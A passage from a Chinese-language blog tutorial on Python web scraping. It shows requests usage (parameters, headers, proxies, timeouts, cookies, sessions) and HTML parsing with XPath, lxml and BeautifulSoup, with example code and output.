&#123;</span><br><span class="line">     <span class="string">&#x27;User-Agent&#x27;</span>: <span class="string">&#x27;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.94 Safari/537.36&#x27;</span>,</span><br><span class="line">     <span class="string">&#x27;Referer&#x27;</span>: <span class="string">&#x27;https://www.lagou.com/jobs/list_python?labelWords=&amp;fromSearch=true&amp;suginput=&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">#params 接收一个字典或者字符串的查询参数，字典类型自动转换为url编码，不需要urlencode()</span></span><br><span class="line">params = &#123;<span class="string">&#x27;key1&#x27;</span>: <span class="string">&#x27;python&#x27;</span>, <span class="string">&#x27;key2&#x27;</span>: <span class="string">&#x27;java&#x27;</span>&#125;</span><br><span class="line"><span class="comment">#发送get请求并带上参数以及请求头,设置超时时间。</span></span><br><span class="line">r = requests.get(url=<span class="string">&#x27;http://baidu.com&#x27;</span>,headers=headers,params=params, timeout=<span class="number">3</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 注意观察url地址，它已经将参数拼接起来</span></span><br><span class="line">print(<span class="string">&#x27;URL地址：&#x27;</span>, r.url)</span><br><span class="line"><span class="comment"># 响应状态码，成功返回200，失败40x或50x。</span></span><br><span class="line">print(<span class="string">&#x27;请求状态码：&#x27;</span>, r.status_code)</span><br><span class="line">print(<span class="string">&#x27;header信息:&#x27;</span>, r.headers)</span><br><span class="line">print(<span class="string">&#x27;cookie信息：&#x27;</span>, r.cookies)</span><br><span class="line"><span class="comment">#返回响应数据,html内容。</span></span><br><span class="line">print(<span class="string">&#x27;响应的数据：&#x27;</span>, r.text)</span><br><span class="line"><span class="comment"># 如响应是json数据 ，可以使用 r.json()自动转换为dict</span></span><br><span class="line">print(<span class="string">&#x27;响应json数据&#x27;</span>, r.json())</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">URL地址： http:&#x2F;&#x2F;httpbin.org&#x2F;get?key1&#x3D;python&amp;key2&#x3D;java</span><br><span class="line">请求状态码： 200</span><br><span class="line">header信息: &#123;&#39;Date&#39;: &#39;Mon, 28 Sep 2020 07:02:06 GMT&#39;, &#39;Content-Type&#39;: &#39;application&#x2F;json&#39;, &#39;Content-Length&#39;: &#39;373&#39;, &#39;Connection&#39;: &#39;keep-alive&#39;, &#39;Server&#39;: &#39;gunicorn&#x2F;19.9.0&#39;, &#39;Access-Control-Allow-Origin&#39;: &#39;*&#39;, &#39;Access-Control-Allow-Credentials&#39;: &#39;true&#39;&#125;</span><br><span class="line">cookie信息： &lt;RequestsCookieJar[]&gt;</span><br><span class="line">响应的数据： &#123;</span><br><span class="line">  &quot;args&quot;: &#123;</span><br><span class="line">    &quot;key1&quot;: &quot;python&quot;,</span><br><span class="line">    &quot;key2&quot;: &quot;java&quot;</span><br><span class="line">  &#125;,</span><br><span class="line">  &quot;headers&quot;: &#123;</span><br><span class="line">    &quot;Accept&quot;: &quot;*&#x2F;*&quot;,</span><br><span class="line">    &quot;Accept-Encoding&quot;: &quot;gzip, deflate&quot;,</span><br><span class="line">    &quot;Host&quot;: &quot;httpbin.org&quot;,</span><br><span class="line">    &quot;User-Agent&quot;: &quot;python-requests&#x2F;2.23.0&quot;,</span><br><span class="line">    &quot;X-Amzn-Trace-Id&quot;: &quot;Root&#x3D;1-5f718a6e-659bccfc8f4f4d2473c9f92c&quot;</span><br><span class="line">  &#125;,</span><br><span class="line">  &quot;origin&quot;: &quot;111.14.212.75&quot;,</span><br><span class="line">  &quot;url&quot;: &quot;http:&#x2F;&#x2F;httpbin.org&#x2F;get?key1&#x3D;python&amp;key2&#x3D;java&quot;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">响应json数据 &#123;&#39;args&#39;: &#123;&#39;key1&#39;: &#39;python&#39;, &#39;key2&#39;: &#39;java&#39;&#125;, &#39;headers&#39;: &#123;&#39;Accept&#39;: &#39;*&#x2F;*&#39;, &#39;Accept-Encoding&#39;: &#39;gzip, deflate&#39;, &#39;Host&#39;: &#39;httpbin.org&#39;, &#39;User-Agent&#39;: &#39;python-requests&#x2F;2.23.0&#39;, &#39;X-Amzn-Trace-Id&#39;: &#39;Root&#x3D;1-5f718a6e-659bccfc8f4f4d2473c9f92c&#39;&#125;, &#39;origin&#39;: &#39;111.14.212.75&#39;, &#39;url&#39;: &#39;http:&#x2F;&#x2F;httpbin.org&#x2F;get?key1&#x3D;python&amp;key2&#x3D;java&#39;&#125;</span><br></pre></td></tr></table></figure><h5 id="Post请求"><a href="#Post请求" class="headerlink" title="Post请求"></a>Post请求</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;https://www.lagou.com/jobs/positionAjax.json?city=%E6%B7%B1%E5%9C%B3&amp;needAddtionalResult=false&amp;isSchoolJob=0&quot;</span></span><br><span class="line"></span><br><span class="line">headers = &#123;</span><br><span class="line">     <span class="string">&#x27;User-Agent&#x27;</span>: <span class="string">&#x27;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.94 Safari/537.36&#x27;</span>,</span><br><span class="line">     <span class="string">&#x27;Referer&#x27;</span>: <span class="string">&#x27;https://www.lagou.com/jobs/list_python?labelWords=&amp;fromSearch=true&amp;suginput=&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line">data = &#123;</span><br><span class="line">     <span class="string">&#x27;first&#x27;</span>: <span class="string">&#x27;true&#x27;</span>,</span><br><span class="line">     <span class="string">&#x27;pn&#x27;</span>: <span class="number">1</span>,</span><br><span class="line">     <span class="string">&#x27;kd&#x27;</span>: <span class="string">&#x27;python&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">resp = requests.post(url,headers=headers,data=data)</span><br><span class="line"><span class="comment"># 如果是json数据，直接可以调用json方法</span></span><br><span class="line">print(resp.json())</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#39;status&#39;: False, &#39;msg&#39;: &#39;请求成功!&#39;, &#39;clientIp&#39;: &#39;111.14.212.75&#39;, &#39;state&#39;: 2402&#125;</span><br></pre></td></tr></table></figure><h5 id="Get请求与Post请求设置代理"><a href="#Get请求与Post请求设置代理" class="headerlink" title="Get请求与Post请求设置代理"></a>Get请求与Post请求设置代理</h5><p>使用<code>requests</code>添加代理也非常简单，只要在请求的方法中（比如<code>get</code>或者<code>post</code>）传递<code>proxies</code>参数就可以了。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://httpbin.org/get&quot;</span></span><br><span class="line"></span><br><span class="line">headers = &#123;</span><br><span class="line">    <span class="string">&#x27;User-Agent&#x27;</span>: <span class="string">&#x27;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.94 Safari/537.36&#x27;</span>,</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">proxy = &#123;</span><br><span class="line">    <span class="string">&#x27;http&#x27;</span>: <span class="string">&#x27;171.14.209.180:27829&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">resp = requests.get(url,headers=headers,proxies=proxy)</span><br><span class="line">print(resp.text)</span><br></pre></td></tr></table></figure><h5 id="处理请求包"><a href="#处理请求包" class="headerlink" title="处理请求包"></a>处理请求包</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://baidu.com&quot;</span></span><br><span class="line"></span><br><span class="line">respone=requests.get(<span class="string">&quot;http://baidu.com&quot;</span>)</span><br><span class="line"></span><br><span class="line">print(respone.headers)</span><br><span class="line"></span><br><span class="line">print(respone.headers[<span class="string">&#x27;Server&#x27;</span>])</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">➜  Desktop python3 <span class="number">1.</span>py</span><br><span class="line">&#123;<span class="string">&#x27;Date&#x27;</span>: <span class="string">&#x27;Mon, 28 Sep 2020 07:20:24 GMT&#x27;</span>, <span class="string">&#x27;Server&#x27;</span>: <span class="string">&#x27;Apache&#x27;</span>, <span class="string">&#x27;Last-Modified&#x27;</span>: <span class="string">&#x27;Tue, 12 Jan 2010 13:48:00 GMT&#x27;</span>, <span class="string">&#x27;ETag&#x27;</span>: <span class="string">&#x27;&quot;51-47cf7e6ee8400&quot;&#x27;</span>, <span class="string">&#x27;Accept-Ranges&#x27;</span>: <span class="string">&#x27;bytes&#x27;</span>, <span class="string">&#x27;Content-Length&#x27;</span>: <span class="string">&#x27;81&#x27;</span>, <span class="string">&#x27;Cache-Control&#x27;</span>: <span class="string">&#x27;max-age=86400&#x27;</span>, <span class="string">&#x27;Expires&#x27;</span>: <span class="string">&#x27;Tue, 29 Sep 2020 07:20:24 GMT&#x27;</span>, <span class="string">&#x27;Connection&#x27;</span>: <span class="string">&#x27;Keep-Alive&#x27;</span>, <span class="string">&#x27;Content-Type&#x27;</span>: <span class="string">&#x27;text/html&#x27;</span>&#125;</span><br><span class="line">Apache</span><br></pre></td></tr></table></figure><ul><li>respone.headers请求包的请求头，返回值是一个字典。</li><li>通过对字典操作，取出对应的请求头。</li></ul><h5 id="超时"><a href="#超时" class="headerlink" title="超时"></a>超时</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://baidu.com&quot;</span></span><br><span class="line"></span><br><span class="line">respone=requests.get(<span class="string">&quot;http://sss.com&quot;</span>,timeout=<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">print(respone.reason)</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">requests.exceptions.ConnectTimeout: HTTPConnectionPool(host=<span class="string">&#x27;sss.com&#x27;</span>, port=<span class="number">80</span>): Max retries exceeded <span class="keyword">with</span> url: / (Caused by ConnectTimeoutError(&lt;urllib3.connection.HTTPConnection object at <span class="number">0x10f118550</span>&gt;, <span class="string">&#x27;Connection to sss.com timed out. (connect timeout=1)&#x27;</span>))</span><br></pre></td></tr></table></figure><p>timeout 仅对连接过程有效，与响应体的下载无关。 timeout 并不是整个下载响应的时间限制，而是如果服务器在 timeout 秒内没有应答，将会引发一个异常（更精确地说，是在 timeout 秒内没有从基础套接字上接收到任何字节的数据时）If no timeout is specified explicitly, requests do not time out。</p><h5 id="cookie操作"><a href="#cookie操作" class="headerlink" title="cookie操作"></a>cookie操作</h5><p>获取cookie</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">r = requests.get(<span class="string">&quot;https://www.csdn.net&quot;</span>)</span><br><span class="line">print(type(r.cookies), r.cookies)</span><br><span class="line"><span class="keyword">for</span> key, value <span class="keyword">in</span> r.cookies.items():</span><br><span class="line">    print(key + <span class="string">&#x27;=&#x27;</span> + value)</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;class &#39;requests.cookies.RequestsCookieJar&#39;&gt; &lt;RequestsCookieJar[&lt;Cookie dc_session_id&#x3D;10_1575798031732.659641 for .csdn.net&#x2F;&gt;, &lt;Cookie uuid_tt_dd&#x3D;10_19615575150-1575798031732-646184 for .csdn.net&#x2F;&gt;, &lt;Cookie acw_tc&#x3D;2760827715757980317314369e26895215355a996a74e112d9936f512dacd1 for www.csdn.net&#x2F;&gt;]&gt;</span><br><span class="line">dc_session_id&#x3D;10_1575798031732.659641</span><br><span class="line">uuid_tt_dd&#x3D;10_19615575150-1575798031732-646184</span><br><span class="line">acw_tc&#x3D;2760827715757980317314369e26895215355a996a74e112d9936f512dacd1</span><br></pre></td></tr></table></figure><p>在 Requests 中我们使用 <code>cookies</code> 属性就可以直接得到 Cookies 。通过打印我们可以发现它的类型是 <code>requests.cookies.RequestsCookieJar</code> ，然后用 <code>items()</code> 方法将其转化为元组组成的列表，遍历输出每一个 Cookie 的名称和值，实现 Cookie 的遍历解析。</p><p>共享cookie</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"><span class="comment"># 通过Session类新建一个会话</span></span><br><span class="line">session = requests.Session()</span><br><span class="line">post_url = <span class="string">&#x27;https://passport.weibo.cn/sso/login&#x27;</span></span><br><span class="line"><span class="comment"># 往下使用requests的地方，直接使用session即可，session就会保存服务器发送过来的cookie信息</span></span><br><span class="line">headers = &#123;</span><br><span class="line">    <span class="string">&#x27;User-Agent&#x27;</span>: <span class="string">&#x27;Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.108 Safari/537.36&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Referer&#x27;</span>: <span class="string">&#x27;https://passport.weibo.cn/signin/login?entry=mweibo&amp;r=http%3A%2F%2Fweibo.cn%2F&amp;backTitle=%CE%A2%B2%A9&amp;vt=&#x27;</span>,</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">data = &#123;</span><br><span class="line">    <span class="string">&#x27;username&#x27;</span>: <span class="string">&#x27;17312345678&#x27;</span>, <span class="comment"># 账号</span></span><br><span class="line">    <span class="string">&#x27;password&#x27;</span>: <span class="string">&#x27;password&#x27;</span>, <span class="comment"># 密码</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">r = session.post(url=post_url, data=data, headers=headers)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 上面的session会保存会话，往下发送请求，直接使用session即可</span></span><br><span class="line">url = <span class="string">&#x27;https://weibo.cn/6388179289/info&#x27;</span></span><br><span class="line">headers1 = &#123;</span><br><span class="line">    <span class="string">&#x27;User-Agent&#x27;</span>: <span class="string">&#x27;Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.108 Safari/537.36&#x27;</span>,</span><br><span class="line">&#125;</span><br><span class="line">r = session.get(url=url, headers=headers1)</span><br><span class="line">print(r.text)</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line"></span><br><span class="line">s&#x3D;requests.get(&#39;https:&#x2F;&#x2F;httpbin.org&#x2F;cookies&#x2F;set&#x2F;number&#x2F;123456789&#39;)</span><br><span class="line">r &#x3D; requests.get(&#39;https:&#x2F;&#x2F;httpbin.org&#x2F;cookies&#39;)</span><br><span class="line">print(s.text)</span><br><span class="line">print(r.text)</span><br></pre></td></tr></table></figure><p>可以发现两次get请求第一次有cookie但是第二次没cookie</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">➜  ~ python &#x2F;Users&#x2F;apple&#x2F;Desktop&#x2F;1.py</span><br><span class="line">&#123;</span><br><span class="line">  &quot;cookies&quot;: &#123;</span><br><span class="line">    &quot;number&quot;: &quot;123456789&quot;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">  &quot;cookies&quot;: &#123;&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>如果使用Session()</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line"></span><br><span class="line">s &#x3D; requests.Session()</span><br><span class="line">s.get(&#39;https:&#x2F;&#x2F;httpbin.org&#x2F;cookies&#x2F;set&#x2F;number&#x2F;123456789&#39;)</span><br><span class="line">print(s.text)</span><br><span class="line">r &#x3D; s.get(&#39;https:&#x2F;&#x2F;httpbin.org&#x2F;cookies&#39;)</span><br><span class="line">print(r.text)</span><br></pre></td></tr></table></figure><p>可以看到两个回话都带有相同cookie</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">➜  ~ python &#x2F;Users&#x2F;apple&#x2F;Desktop&#x2F;1.py</span><br><span class="line">&#123;</span><br><span class="line">  &quot;cookies&quot;: &#123;</span><br><span class="line">    &quot;number&quot;: &quot;123456789&quot;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">  &quot;cookies&quot;: &#123;</span><br><span class="line">    &quot;number&quot;: &quot;123456789&quot;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h5 id="requests请求返回对象Response的常用方法"><a href="#requests请求返回对象Response的常用方法" class="headerlink" title="requests请求返回对象Response的常用方法"></a>requests请求返回对象Response的常用方法</h5><p>Response响应类常用属性与方法：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">Response.url           请求url，[见示例2.1]</span><br><span class="line">Response.status_code   响应状态码，[见示例2.1]</span><br><span class="line">Response.text          获取响应内容，[见示例2.1]</span><br><span class="line">Response.json()       活动响应的JSON内容，[见示例2.1]</span><br><span class="line">Response.ok            请求是否成功，status_code&lt;400 返回True</span><br><span class="line">Response.headers       响应header信息，[见示例2.1]</span><br><span class="line">Response.cookies       响应的cookie，[见示例2.1]</span><br><span class="line">Response.elapsed       请求响应的时间。</span><br><span class="line">Response.links         返回响应头部的links连接，相当于Response.headers.get(&#39;link&#39;)</span><br><span class="line">Response.raw           获取原始套接字响应，需要将初始请求参数stream&#x3D;True</span><br><span class="line">Response.content        以字节形式获取响应提，多用于非文本请求，[见示例2.2]</span><br><span class="line">Response.iter_content() 迭代获取响应数据，[见示例2.2]</span><br><span class="line">Response.history重定向请求历史记录</span><br><span class="line">Response.reason响应状态的文本原因，如：&quot;Not Found&quot; or &quot;OK&quot;</span><br><span class="line">Response.close()关闭并释放链接，释放后不能再次访问’raw’对象。一般不会调用。</span><br></pre></td></tr></table></figure><h5 id="requests的content和text方法的区别"><a href="#requests的content和text方法的区别" class="headerlink" title="requests的content和text方法的区别"></a>requests的content和text方法的区别</h5><ul><li><p>resp.text返回的是Unicode型的数据。</p></li><li><p>resp.content返回的是bytes型也就是二进制的数据。</p><p>简而言之，.text是现成的字符串，.content还要编码，但是.text不是所有时候显示都正常，这是就需要用.content进行手动编码。通常我们需要<code>.content.decode(&#39;编码格式&#39;)</code>，其中编码格式我们需要右键网页源代码，查看网页的编码。</p></li><li><p>如果你想取文本，可以通过r.text。</p><p>如果想取图片，文件，则可以通过r.content。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line"></span><br><span class="line">jpg_url &#x3D; &#39;http:&#x2F;&#x2F;img2.niutuku.com&#x2F;1312&#x2F;0804&#x2F;0804-niutuku.com-27840.jpg&#39;</span><br><span class="line"></span><br><span class="line">content &#x3D; requests.get(jpg_url).content</span><br><span class="line"></span><br><span class="line">with open(&#39;demo.jpg&#39;, &#39;wb&#39;) as fp:</span><br><span class="line">    fp.write(content)</span><br></pre></td></tr></table></figure></li></ul><h3 id="数据提取"><a href="#数据提取" class="headerlink" title="数据提取"></a>数据提取</h3><h4 id="XPath"><a href="#XPath" class="headerlink" title="XPath"></a>XPath</h4><p>xpath（XML Path Language）是一门在XML和HTML文档中查找信息的语言，可用来在XML和HTML文档中对元素和属性进行遍历。</p><h5 id="XPath语法"><a href="#XPath语法" class="headerlink" title="XPath语法"></a>XPath语法</h5><p><img src="https://steady-1302023625.cos.ap-beijing.myqcloud.com/makedown/image-20200928201555572.png" alt="image-20200928201555572"></p><h5 id="XPATH语法"><a href="#XPATH语法" class="headerlink" title="XPATH语法"></a>XPATH语法</h5><p><img src="https://steady-1302023625.cos.ap-beijing.myqcloud.com/makedown/image-20200928202240146.png" alt="image-20200928202240146"></p><p>补充</p><table><thead><tr><th>/</th><th>如果是在最前面，代表从根节点选取。否则选择某节点下的某个节点</th><th></th></tr></thead><tbody><tr><td>//</td><td>从全局节点中选择节点，随便在哪个位置</td><td></td></tr><tr><td>@</td><td>选取某个节点的属性</td><td></td></tr><tr><td>.</td><td>当前节点</td><td></td></tr></tbody></table><h5 id="lxml库"><a href="#lxml库" class="headerlink" title="lxml库"></a>lxml库</h5><p>lxml 是 一个HTML/XML的解析器，主要的功能是如何解析和提取 HTML/XML 数据。</p><ol><li><p>导入lxml 的 etree 库 <code>from lxml import etree</code></p></li><li><p>利用etree.HTML，将html字符串（bytes类型或str类型）转化为Element对象，Element对象具有xpath的方法，返回结果的列表</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">html &#x3D; etree.HTML(text) </span><br><span class="line">ret_list &#x3D; html.xpath(&quot;xpath语法规则字符串&quot;)</span><br></pre></td></tr></table></figure></li><li><p>xpath方法返回列表的三种情况</p><ul><li><p>返回空列表：根据xpath语法规则字符串，没有定位到任何元素</p></li><li><p>返回由字符串构成的列表：xpath字符串规则匹配的一定是文本内容或某属性的值</p></li><li><p>返回由Element对象构成的列表：xpath规则字符串匹配的是标签，列表中的Element对象可以继续进行xpath</p></li></ul></li></ol><h4 id="BeautifulSoup4"><a href="#BeautifulSoup4" class="headerlink" title="BeautifulSoup4"></a>BeautifulSoup4</h4><p>Beautiful Soup 也是一个HTML/XML的解析器，主要的功能也是如何解析和提取 HTML/XML 数据。<br>lxml 只会局部遍历，而Beautiful Soup 是基于HTML DOM（Document Object Model）的，会载入整个文档，解析整个DOM树，因此时间和内存开销都会大很多，所以性能要低于lxml。<br>BeautifulSoup 用来解析 HTML 比较简单，API非常人性化，支持CSS选择器、Python标准库中的HTML解析器，也支持 lxml 的 XML解析器。</p><p>Beautiful Soup将复杂HTML文档转换成一个复杂的树形结构,每个节点都是Python对象,所有对象可以归纳为4种:</p><ol><li>Tag </li><li>NavigatableString </li><li>BeautifulSoup </li><li>Comment</li></ol><h5 id="创建bs对象"><a href="#创建bs对象" class="headerlink" title="创建bs对象"></a>创建bs对象</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">from bs4 import BeautifulSoupimport requestsresponse &#x3D; requests.get(&#39;https:&#x2F;&#x2F;book.douban.com&#x2F;&#39;).text# print(response)# 创建bs对象soup &#x3D; BeautifulSoup(response, &#39;lxml&#39;)  # 使用到了lxml解析库</span><br></pre></td></tr></table></figure><h5 id="Tag"><a href="#Tag" class="headerlink" title="Tag"></a>Tag</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> bs4 <span class="keyword">import</span> BeautifulSoup</span><br><span class="line"></span><br><span class="line">html = <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">&lt;html&gt;&lt;head&gt;&lt;title&gt;The Dormouse&#x27;s story&lt;/title&gt;&lt;/head&gt;</span></span><br><span class="line"><span class="string">&lt;body&gt;</span></span><br><span class="line"><span class="string">&lt;p class=&quot;title&quot; name=&quot;dromouse&quot;&gt;&lt;b&gt;The Dormouse&#x27;s story&lt;/b&gt;&lt;/p&gt;</span></span><br><span class="line"><span class="string">&lt;p class=&quot;story&quot;&gt;Once upon a time there were three little sisters; and their names were</span></span><br><span class="line"><span class="string">&lt;a href=&quot;http://example.com/elsie&quot; class=&quot;sister&quot; id=&quot;link1&quot;&gt;&lt;!-- Elsie --&gt;&lt;/a&gt;,</span></span><br><span class="line"><span class="string">&lt;a href=&quot;http://example.com/lacie&quot; class=&quot;sister&quot; id=&quot;link2&quot;&gt;Lacie&lt;/a&gt; and</span></span><br><span class="line"><span class="string">&lt;a href=&quot;http://example.com/tillie&quot; class=&quot;sister&quot; id=&quot;link3&quot;&gt;Tillie&lt;/a&gt;;</span></span><br><span class="line"><span class="string">and they lived at the bottom of a well.&lt;/p&gt;</span></span><br><span class="line"><span class="string">&lt;p class=&quot;story&quot;&gt;...&lt;/p&gt;</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line">soup = BeautifulSoup(html,<span class="string">&#x27;lxml&#x27;</span>)</span><br><span class="line">print(soup.title)</span><br><span class="line">print(soup.head)</span><br><span class="line">print(soup.a)</span><br><span class="line">print(soup.p)</span><br><span class="line">print(type(soup.p))</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;title&gt;The Dormouse&#39;s story&lt;&#x2F;title&gt;</span><br><span class="line">&lt;head&gt;&lt;title&gt;The Dormouse&#39;s story&lt;&#x2F;title&gt;&lt;&#x2F;head&gt;</span><br><span class="line">&lt;a class&#x3D;&quot;sister&quot; href&#x3D;&quot;http:&#x2F;&#x2F;example.com&#x2F;elsie&quot; id&#x3D;&quot;link1&quot;&gt;&lt;!-- Elsie --&gt;&lt;&#x2F;a&gt;</span><br><span class="line">&lt;p class&#x3D;&quot;title&quot; name&#x3D;&quot;dromouse&quot;&gt;&lt;b&gt;The Dormouse&#39;s 